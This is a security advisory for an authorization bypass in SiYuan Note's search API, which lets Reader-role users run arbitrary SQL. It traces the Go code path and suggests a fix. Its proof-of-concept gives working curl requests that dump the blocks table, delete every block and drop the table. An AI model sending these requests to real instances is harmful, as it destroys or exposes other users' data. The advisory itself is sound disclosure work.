# [C] SiYuan: Authorization Bypass Allows Arbitrary SQL Execution via Search API

## Summary
Severity: Critical
Advisory: GHSA-j7wh-x834-p3r7
CVE: CVE-2026-32767
CWE: CWE-863, CWE-89
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-j7wh-x834-p3r7
Type: github-advisory

## Affected
- Go: `github.com/siyuan-note/siyuan/kernel` — affected >=0

## Details
## Summary

SiYuan Note v3.6.0 (and likely prior versions) contains an authorization bypass vulnerability in the `/api/search/fullTextSearchBlock` endpoint. When the `method` parameter is set to `2`, the endpoint passes user-supplied input directly as a raw SQL statement to the underlying SQLite database without any authorization or read-only checks. This allows any authenticated user — including those with the `Reader` role — to execute arbitrary SQL statements (SELECT, DELETE, UPDATE, DROP TABLE, etc.) against the application's database.

This is inconsistent with the application's own security model: the dedicated SQL endpoint (`/api/query/sql`) correctly requires both `CheckAdminRole` and `CheckReadonly` middleware, but the search endpoint bypasses these controls entirely.

## Root Cause Analysis

### The Vulnerable Endpoint

**File:** `kernel/api/router.go`, line 188

```go
ginServer.Handle("POST", "/api/search/fullTextSearchBlock", model.CheckAuth, fullTextSearchBlock)
```

This endpoint only applies `model.CheckAuth`, which permits **any** authenticated role (Administrator, Editor, or Reader).

### The Properly Protected Endpoint (for comparison)

**File:** `kernel/api/router.go`, line 177

```go
ginServer.Handle("POST", "/api/query/sql", model.CheckAuth, model.CheckAdminRole, model.CheckReadonly, SQL)
```

This endpoint correctly chains `CheckAdminRole` and `CheckReadonly`, restricting SQL execution to administrators in read-write mode.

### The Vulnerable Code Path

**File:** `kernel/api/search.go`, lines 389-411

```go
func fullTextSearchBlock(c *gin.Context) {
    // ...
    page, pageSize, query, paths, boxes, types, method, orderBy, groupBy := parseSearchBlockArgs(arg)
    blocks, matchedBlockCount, matchedRootCount, pageCount, docMode :=
        model.FullTextSearchBlock(query, boxes, paths, types, method, orderBy, groupBy, page, pageSize)
    // ...
}
```

**File:** `kernel/model/search.go`, lines 1205-1206

```go
case 2: // SQL
    blocks, matchedBlockCount, matchedRootCount = searchBySQL(query, beforeLen, page, pageSize)
```

When `method=2`, the raw `query` string is passed directly to `searchBySQL()`.

**File:** `kernel/model/search.go`, lines 1460-1462

```go
func searchBySQL(stmt string, beforeLen, page, pageSize int) (ret []*Block, ...) {
    stmt = strings.TrimSpace(stmt)
    blocks := sql.SelectBlocksRawStmt(stmt, page, pageSize)
```

**File:** `kernel/sql/block_query.go`, lines 566-569, 713-714

```go
func SelectBlocksRawStmt(stmt string, page, limit int) (ret []*Block) {
    parsedStmt, err := sqlparser.Parse(stmt)
    if err != nil {
        return selectBlocksRawStmt(stmt, limit)  // Falls through to raw execution
    }
    // ...
}

func selectBlocksRawStmt(stmt string, limit int) (ret []*Block) {
    rows, err := query(stmt)  // Executes arbitrary SQL
    // ...
}
```

**File:** `kernel/sql/database.go`, lines 1327-1337

```go
func query(query string, args ...interface{}) (*sql.Rows, error) {
    // ...
    return db.Query(query, args...)  // Go's database/sql db.Query — executes ANY SQL
}
```

Go's `database/sql` `db.Query()` will execute any SQL statement, including `DELETE`, `UPDATE`, `DROP TABLE`, `INSERT`, etc. The returned `*sql.Rows` will simply be empty for non-SELECT statements, but the destructive operation is still executed.

### Authorization Model

**File:** `kernel/model/session.go`, lines 201-210

```go
func CheckAuth(c *gin.Context) {
    // Already authenticated via JWT
    if role := GetGinContextRole(c); IsValidRole(role, []Role{
        RoleAdministrator,
        RoleEditor,
        RoleReader,       // <-- Reader role passes CheckAuth
    }) {
        c.Next()
        return
    }
    // ...
}
```

**File:** `kernel/model/session.go`, lines 380-386

```go
func CheckAdminRole(c *gin.Context) {
    if IsAdminRoleContext(c) {
        c.Next()
    } else {
        c.AbortWithStatus(http.StatusForbidden)  // <-- This check is MISSING on the search endpoint
    }
}
```

## Proof of Concept

### Prerequisites
- SiYuan instance accessible over the network (e.g., Docker deployment)
- Valid authentication as any user role (including `Reader`)

### Steps to Reproduce

1. Authenticate to SiYuan and obtain a valid session cookie or API token.

2. **Read all data (confidentiality breach):**
```bash
curl -X POST http://<target>:6806/api/search/fullTextSearchBlock \
  -H "Content-Type: application/json" \
  -H "Authorization: Token <reader_token>" \
  -d '{"method": 2, "query": "SELECT * FROM blocks LIMIT 100"}'
```

3. **Delete all blocks (integrity/availability breach):**
```bash
curl -X POST http://<target>:6806/api/search/fullTextSearchBlock \
  -H "Content-Type: application/json" \
  -H "Authorization: Token <reader_token>" \
  -d '{"method": 2, "query": "DELETE FROM blocks"}'
```

4. **Drop tables (availability breach):**
```bash
curl -X POST http://<target>:6806/api/search/fullTextSearchBlock \
  -H "Content-Type: application/json" \
  -H "Authorization: Token <reader_token>" \
  -d '{"method": 2, "query": "DROP TABLE blocks"}'
```

5. **Compare with the properly protected endpoint** (should return HTTP 403 for Reader role):
```bash
curl -X POST http://<target>:6806/api/query/sql \
  -H "Content-Type: application/json" \
  -H "Authorization: Token <reader_token>" \
  -d '{"stmt": "SELECT * FROM blocks LIMIT 10"}'
```

### Expected Behavior
The search endpoint should reject SQL execution for non-admin users, or at minimum enforce read-only access, consistent with `/api/query/sql`.

### Actual Behavior
Any authenticated user (including Reader role) can execute arbitrary SQL including destructive operations.

## Impact

In a multi-user deployment (e.g., Docker with published access, or any network-accessible instance with access authorization code):

- **Confidentiality:** A Reader-role user can read all data in the SQLite database, including blocks, assets, references, and configuration data they should not have access to.
- **Integrity:** A Reader-role user can modify or delete any data in the database, despite having read-only access by design.
- **Availability:** A Reader-role user can drop tables or corrupt the database, rendering the application unusable.

## Suggested Fix

Add `CheckAdminRole` and `CheckReadonly` middleware to the search endpoint, or add explicit validation that only SELECT statements are accepted when `method=2`:

**Option A — Restrict method=2 to admin (recommended):**

In `kernel/api/search.go`, add a role check when `method=2`:

```go
func fullTextSearchBlock(c *gin.Context) {
    // ...
    page, pageSize, query, paths, boxes, types, method, orderBy, groupBy := parseSearchBlockArgs(arg)

    // SQL mode requires admin privileges, consistent with /api/query/sql
    if method == 2 && !model.IsAdminRoleContext(c) {
        ret.Code = -1
        ret.Msg = "SQL search requires administrator privileges"
        return
    }
    // ...
}
```

**Option B — Enforce SELECT-only for non-admin users:**

Validate the parsed SQL to ensure only SELECT statements are executed when the user is not an administrator.

## References
- https://github.com/siyuan-note/siyuan/security/advisories/GHSA-j7wh-x834-p3r7
- https://nvd.nist.gov/vuln/detail/CVE-2026-32767
- https://github.com/siyuan-note/siyuan/issues/17209
- https://github.com/siyuan-note/siyuan/commit/d5e2d0bce0dffef5f61bd8066954bc2d41181fc5
- https://github.com/siyuan-note/siyuan
- https://github.com/siyuan-note/siyuan/releases/tag/v3.6.1
